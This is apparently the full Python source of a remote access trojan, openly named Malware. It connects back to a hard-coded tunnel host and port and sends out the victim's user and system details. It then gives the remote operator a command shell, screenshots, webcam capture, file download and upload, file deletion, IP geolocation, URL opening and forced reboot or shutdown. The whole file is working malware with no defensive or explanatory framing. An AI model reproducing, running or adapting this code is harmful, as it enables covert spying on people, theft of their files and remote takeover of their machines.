import socket
import threading 
import os 
import subprocess
import pyautogui
import sys 
import platform
import time
import requests
import webbrowser
from cv2 import VideoCapture , imwrite
class Malware():
    def __init__(self):
        self.i = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.host = 'feb-freely.gl.at.ply.gg'
        self.port = 52979
        self.user = os.getlogin()
        self.hostname = socket.gethostname()
        
        self.me = sys.argv[0]
        self.filename = os.path.basename(self.me)
        self.info = f"""
____________________________ 
        I N F O 
____________________________

User ==> {self.user}
Hostname ==> {self.hostname}
Os ==> {platform.system()}
Release ==> {platform.release()}
Filename ==> {self.filename}
Archetecture ==> {platform.architecture()[0]}
Python Version ==> {platform.python_version()}
"""
        self.whoami = f"""
_____________________________
            WHOAMI
_____________________________

User ===> {self.user}
Root ===> {self.check_admin()}

"""
    def connect(self):
        while True:
            try:
                self.i.connect((self.host , self.port))
                self.interact_server()
            except Exception as e :
                print(f'Error  : {e}')
                pass
    def check_admin(self):
        try:
            os.mkdir('C:/Windows/system32/Windows_Sounds')
            os.rmdir('C:/Windows/system32/Windows_Sounds')
            return 'root'
        except PermissionError:
            return 'no_root'
    def interact_server(self):
        try:
            self.i.sendall(self.hostname.encode())
            while True:
                command = self.i.recv(1024).decode()
                if command == 'info':
                    self.i.sendall(self.info.encode())
                elif command == 'shell':
                    while True:
                        command = self.i.recv(1024).decode()
                        if command.startswith('cd'):
                            try:
                                data = command.split()
                                os.chdir(data[1])
                                self.i.sendall('<end>'.encode())
                            except:
                                output = subprocess.getoutput(command)
                                self.i.sendall(output.encode())
                                self.i.sendall('<end>'.encode())
                        elif command == 'exit':
                            break
                        else:
                            output = subprocess.getoutput(command)
                            if len(output) > 0 and output != None:
                                self.i.sendall(output.encode())
                                self.i.sendall('<end>'.encode())
                    
                            else:
                                self.i.sendall('no_output'.encode())
                elif command == 'whoami':
                    self.i.sendall(self.whoami.encode())
                elif command == 'dir':
                    output = subprocess.getoutput(command)
                    self.i.sendall(output.encode())
                    self.i.sendall('<end>'.encode())
                elif command == 'pwd':
                    output = os.getcwd()
                    self.i.sendall(output.encode())
                elif command.startswith('remove'):
                    try:
                        data = command.split()
                        dirw = os.listdir()
                        if data[1] in dirw:
                            self.i.sendall('removed'.encode())
                            os.remove(data[1])
                        else:
                            
                            self.i.sendall('not_found'.encode())
                    except PermissionError:
                        self.i.sendall('no_root'.encode())
                elif command == 'screenshot':
                    if self.check_admin() == 'root': # Try To hide The JPG File
                        screenshot = pyautogui.screenshot()
                        screenshot.save('C:/screenshot.jpg')
                        with open('C:/screenshot.jpg' , 'rb') as file:
                            while True:
                                data = file.read(1024)
                                if len(data) == 0:
                                    self.i.sendall('<end>'.encode())
                                    break
                                else:
                                    self.i.sendall(data)
                    else:
                        screenshot = pyautogui.screenshot()
                        screenshot.save('screenshot.jpg')
                        with open('screenshot.jpg' , 'rb') as file:
                            while True:
                                data = file.read(1024)
                                if len(data) == 0:
                                    self.i.sendall('<end>'.encode())
                                    break
                                else:
                                    self.i.sendall(data)
                elif command.startswith('download'):
                    try:
                        data = command.split()
                        dirw = os.listdir()
                        if data[1] in dirw:
                            self.i.sendall('found'.encode())
                            with open(data[1] , 'rb') as file:
                                while True:
                                    data = file.read(1024)
                                    if len(data) == 0:
                                        self.i.sendall('<end>'.encode())
                                        break
                                    else:
                                        self.i.sendall(data)
                        else:
                            self.i.sendall('not_found'.encode())
                        
                    except PermissionError:
                        self.i.sendall('no_admin'.encode())
                elif command.startswith('upload'):
                    try:
                        data = command.split()
                        with open("test1.txt" , 'wb') as file:
                            self.i.sendall('work'.encode())
                            while True:
                                data = self.i.recv(1024)
                                if data == b'<end>' or data[-5:] == b'<end>':
                                    if data == b'<end>':
                                        break
                                    else:
                                        file.write(data[:-5])
                                        break
                                else:
                                    file.write(data)
                    except PermissionError:
                        self.i.sendall('no_admin'.encode())
                elif command == 'geolocate':
                    try:
                        r1 = requests.get('https://geolocation-db.com/json')
                        data = r1.json()
                        info = f"""
___________________
    Geolocation
___________________

Country : {data['country_name']}
Country Code : {data['country_code']}
City : {data['city']}
State : {data['state']}
Postal : {data['postal']}                        
Ipv4 : {data['IPv4']}                        
latitude : {data['latitude']}
longitude : {data['longitude']}
Google Maps : https/www.google.com/maps/place/{data['latitude']},{data['longitude']}                 
"""
                        self.i.sendall(info.encode())
                    except:
                        self.i.sendall('Error'.encode())
                elif command.startswith('web'):
                    data = command.split()
                    web = data[1]
                    webbrowser.open(web)
                elif command == 'reboot':
                    os.system('shutdown /r /f /t 0')
                elif command == 'shutdown':
                    os.system('shutdown /s /t 0 /f ')
                elif command == 'quit':
                    break
                elif command == 'cam_capture':
                    try:
                        cam = VideoCapture(0)
                        result , image = cam.read()
                        if result:
                            imwrite('image.jpg',image)
                            self.i.sendall('work'.encode())
                            cam = None
                            with open('image.jpg','rb') as file:
                                while True:
                                    data = file.read(1024)
                                    if len(data) == 0:
                                        self.i.sendall('<end>'.encode())
                                        break
                                    else:
                                        self.i.sendall(data)
                            os.remove('image.jpg')
                    except:
                        self.i.sendall('error'.encode())
                else:
                    pass
        except:
            self.connect()
process = Malware()
process.connect()